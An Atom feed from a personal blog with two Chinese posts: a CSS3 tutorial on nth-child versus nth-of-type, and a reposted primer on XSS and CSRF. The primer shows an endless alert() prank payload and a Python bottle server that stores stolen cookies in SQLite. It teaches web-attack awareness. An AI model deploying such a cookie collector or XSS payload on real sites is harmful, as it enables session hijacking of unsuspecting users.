<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>淡夏的绿茶</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://summerGreenTea.github.io/"/>
  <updated>2016-04-01T07:53:08.328Z</updated>
  <id>http://summerGreenTea.github.io/</id>
  
  <author>
    <name>summer</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSS3 的nth-child和nth-of-type</title>
    <link href="http://summerGreenTea.github.io/2016/03/27/css3-selector-nth-child-and-nth-of-child/"/>
    <id>http://summerGreenTea.github.io/2016/03/27/css3-selector-nth-child-and-nth-of-child/</id>
    <published>2016-03-27T06:48:40.000Z</published>
    <updated>2016-04-01T07:53:08.328Z</updated>
    
    <content type="html">&lt;p&gt;之前就掉进过 &lt;code&gt;nth-child&lt;/code&gt; 和 &lt;code&gt;nth-of-child&lt;/code&gt; 的坑里过，怎么办呢？慢慢爬吧！话说CSS3对选择选择器的扩充可是一大亮点，细细琢磨会发现有许多灵活的运用场景。在看完张鑫旭大神的&lt;a href=&quot;http://www.zhangxinxu.com/wordpress/2011/06/css3%E9%80%89%E6%8B%A9%E5%99%A8nth-child%E5%92%8Cnth-of-type%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSS3选择器:nth-child和:nth-of-type之间的差异&lt;/a&gt;，在jsfiddle上也做了下小测试，有了更多的体会。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;代码开路&quot;&gt;&lt;a href=&quot;#代码开路&quot; class=&quot;headerlink&quot; title=&quot;代码开路&quot;&gt;&lt;/a&gt;代码开路&lt;/h3&gt;&lt;p&gt;HTML结构:&lt;br&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;css&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;selector-tag&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:nth-child(1)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;attribute&quot;&gt;color&lt;/span&gt;: red;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; this is element p &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; this is element p &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; this is element p &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;CSS样式:&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:nth-child(1)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;color&lt;/span&gt;: red;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;img src=&quot;/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic1.png&quot; alt=&quot;1.1&quot; title=&quot;1.1&quot;&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:nth-of-type(1)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;color&lt;/span&gt;: red;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img src=&quot;/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic2.png&quot; alt=&quot;1.2&quot; title=&quot;1.2&quot;&gt;
&lt;p&gt;我们会发现两个例子的第一个p标签的文字都变红了，看出什么”端倪”没？当然看不出来了，根本就没端倪。接着上代码。这次我们把HTML结构修改下。&lt;br&gt;HTML结构:&lt;br&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;this is element div&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; this is element p &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; this is element p &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; this is element p &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;CSS样式:&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:nth-child(1)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;color&lt;/span&gt;: red;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;img src=&quot;/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic3.png&quot; alt=&quot;1.3&quot; title=&quot;1.3&quot;&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:nth-of-type(1)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;color&lt;/span&gt;: red;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img src=&quot;/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic4.png&quot; alt=&quot;1.4&quot; title=&quot;1.4&quot;&gt;
&lt;h3 id=&quot;结果分析&quot;&gt;&lt;a href=&quot;#结果分析&quot; class=&quot;headerlink&quot; title=&quot;结果分析&quot;&gt;&lt;/a&gt;结果分析&lt;/h3&gt;&lt;p&gt;这下看出来了吧！下面就来分析这几段代码产生这些结果的原因。&lt;br&gt;当我们使用&lt;code&gt;p:nth-child(1)&lt;/code&gt;的时候，就有如下匹配规则:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;找到所有P元素的父元素&lt;/li&gt;
&lt;li&gt;找到这些父元素中的第一个子元素是p元素的元素&lt;/li&gt;
&lt;li&gt;为这个p元素匹配该CSS规则&lt;br&gt;我们把重点放在父元素的&lt;em&gt; 父元素中的第一个子元素是p元素的元素 &lt;/em&gt;上。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当我们使用&lt;code&gt;p:nth-of-type(1)&lt;/code&gt;的时候，就有如下匹配规则:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;找到所有p元素的父元素&lt;/li&gt;
&lt;li&gt;找到每个父元素中的所有p元素中第一个元素类型是p元素类型的元素&lt;/li&gt;
&lt;li&gt;为这个p元素匹配该CSS规则&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这次我们重点关注 &lt;em&gt;父元素中的所有p元素中第一个p元素类型元素&lt;/em&gt; 。&lt;/p&gt;
&lt;p&gt;我在学习这两个选择器的时候分析到这里其实思维上有点乱了，我对CSS3的这类选择器的匹配规则的理解是，在原先的基础上加上了一系列的&lt;em&gt; 限制规则 &lt;/em&gt;，这些限制规则不同于&lt;code&gt;p.error&lt;/code&gt;或&lt;code&gt;p[title=&amp;#39;name&amp;#39;]&lt;/code&gt;，它是在位置(出现位置上)、类型(元素类型)有了精确的限制，于此同时，又增加了&lt;code&gt;a[src^=&amp;quot;https&amp;quot;]&lt;/code&gt;、&lt;code&gt;a[src$=&amp;quot;.pdf&amp;quot;]&lt;/code&gt;等模糊条件的精确匹配，所以CSS3选择器是一种 &lt;em&gt; 广度 &lt;/em&gt; 上对CSS选择器的扩充。&lt;/p&gt;
&lt;p&gt;说到了这里，其实也不过就是借别人的光来照亮自己，那么我自己在实践这些选择器的时候发现了一些很容易忽视的点，也是理解不到位容易造成错误的点，上代码。&lt;/p&gt;
&lt;h3 id=&quot;注意点&quot;&gt;&lt;a href=&quot;#注意点&quot; class=&quot;headerlink&quot; title=&quot;注意点&quot;&gt;&lt;/a&gt;注意点&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;div class=&amp;quot;item&amp;quot;&amp;gt;this is element div&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p class=&amp;quot;item&amp;quot;&amp;gt; this is element p &amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p class=&amp;quot;item&amp;quot;&amp;gt; this is element p &amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p class=&amp;quot;item&amp;quot;&amp;gt; this is element p &amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.item:nth-of-type(1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  color: red;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  background: black;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这里肯定一部分人会认为&lt;code&gt;div.item&lt;/code&gt;的背景是黑色的，字体是红色的。看结果:&lt;/p&gt;
&lt;img src=&quot;/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic5.png&quot; alt=&quot;1.5&quot; title=&quot;1.5&quot;&gt;
&lt;p&gt;我的天呐！关键的点就在于那个选择器&lt;code&gt;*-type&lt;/code&gt;，中文翻译为类型。也就是我上面提到的&lt;em&gt; 父元素中的所有p元素中第一个p元素类型元素 &lt;/em&gt;。也就是说，浏览器首先匹配&lt;code&gt;.item&lt;/code&gt;在匹配&lt;code&gt;.item&lt;/code&gt;的类型，再找出每个类型中的第一个子元素应用样式。&lt;br&gt;那么如果是&lt;code&gt;nth-child(1)&lt;/code&gt;的话，那么上面只有&lt;code&gt;div.item&lt;/code&gt;会运用背景黑色字体红色的样式，原因只要稍作比较就可得出。&lt;/p&gt;
&lt;h3 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h3&gt;&lt;p&gt;其实在CSS3提供的伪类选择器中，有一部分也与上述情况相似，再这也就不一一叙述了，读者可顺着相应的思路去思考实践即可。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;之前就掉进过 &lt;code&gt;nth-child&lt;/code&gt; 和 &lt;code&gt;nth-of-child&lt;/code&gt; 的坑里过，怎么办呢？慢慢爬吧！话说CSS3对选择选择器的扩充可是一大亮点，细细琢磨会发现有许多灵活的运用场景。在看完张鑫旭大神的&lt;a href=&quot;http://www.zhangxinxu.com/wordpress/2011/06/css3%E9%80%89%E6%8B%A9%E5%99%A8nth-child%E5%92%8Cnth-of-type%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82/&quot;&gt;CSS3选择器:nth-child和:nth-of-type之间的差异&lt;/a&gt;，在jsfiddle上也做了下小测试，有了更多的体会。&lt;br&gt;
    
    </summary>
    
    
      <category term="CSS3" scheme="http://summerGreenTea.github.io/tags/CSS3/"/>
    
  </entry>
  
  <entry>
    <title>总结 XSS 与 CSRF 两种跨站攻击</title>
    <link href="http://summerGreenTea.github.io/2016/03/23/introduce-to-XSS-and-CSRF/"/>
    <id>http://summerGreenTea.github.io/2016/03/23/introduce-to-XSS-and-CSRF/</id>
    <published>2016-03-23T10:08:34.000Z</published>
    <updated>2016-03-23T11:13:34.841Z</updated>
    
    <content type="html">&lt;p&gt;在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是 SQL 注入成了很流行的攻击方式。在这个年代， 参数化查询 已经成了普遍用法，我们已经离 SQL 注入很远了。但是，历史同样悠久的 XSS 和 CSRF 却没有远离我们。由于之前已经对 XSS 很熟悉了，所以我对用户输入的数据一直非常小心。如果输入的时候没有经过 Tidy 之类的过滤，我一定会在模板输出时候全部转义。所以个人感觉，要避免 XSS 也是很容易的，重点是要“小心”。但最近又听说了另一种跨站攻击 CSRF ，于是找了些资料了解了一下，并与 XSS 放在一起做个比较。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;本文转自: &lt;a href=&quot;https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;XSS：脚本中的不速之客&quot;&gt;&lt;a href=&quot;#XSS：脚本中的不速之客&quot; class=&quot;headerlink&quot; title=&quot;XSS：脚本中的不速之客&quot;&gt;&lt;/a&gt;XSS：脚本中的不速之客&lt;/h3&gt;&lt;p&gt;XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。&lt;br&gt;运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：&lt;/p&gt;
&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    alert(&lt;span class=&quot;string&quot;&gt;&quot;你关不掉我~&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#-*- coding:utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;跨站脚本注入的信息收集服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; bottle&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;app = bottle.Bottle()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;plugin = bottle.ext.sqlite.Plugin(dbfile=&lt;span class=&quot;string&quot;&gt;&#39;/var/db/myxss.sqlite&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;app.install(plugin)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@app.route(&#39;/myxss/&#39;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(cookies, db)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SQL = &lt;span class=&quot;string&quot;&gt;&#39;INSERT INTO &quot;myxss&quot; (&quot;cookies&quot;) VALUES (?)&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        db.execute(SQL, cookies)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&quot;__main__&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    app.run()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后在某一个页面的评论中注入这段代码:&lt;/p&gt;
